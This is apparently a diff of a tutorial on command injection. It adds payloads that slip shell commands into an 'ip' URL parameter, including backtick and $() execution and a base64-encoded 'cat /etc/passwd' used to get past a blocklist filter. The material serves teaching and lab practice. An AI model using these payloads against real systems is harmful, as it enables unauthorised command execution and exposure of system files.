@@ -1,6 +1,3 @@
-
-
-
 ```shell
 http://target:80/python/index.py?ip=127.0.0.1|id
 ```
@@ -41,6 +38,9 @@ Finally, let's discuss some Linux-specific inline execution mechanisms. Consider
 
 ```shell
 `cmd`
+```
+
+```shell
 $(cmd)
 ```
 
@@ -140,6 +140,24 @@ All we need to do is choose the payload we want, and echo it into the base64 bin
 
 ```shell
 echo "cat /etc/passwd" |base64
+```
+
+```shell
+echo "Y2F0IC9ldGMvcGFzc3dkCg==" |base64 -d
+```
+
+URL-encoded
+
+```shell
+echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d
+```
+
+```shell
+http://target/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`
+```
+
+```shell
+http://target/php/blocklisted_exercise.php?ip=127.0.0.1/ni$(Y2F0IC9ldGMvcGFzc3dkCg)d
 ```
 
 # 🔄 Alternatives to `base64` Binary (Encode/Decode)
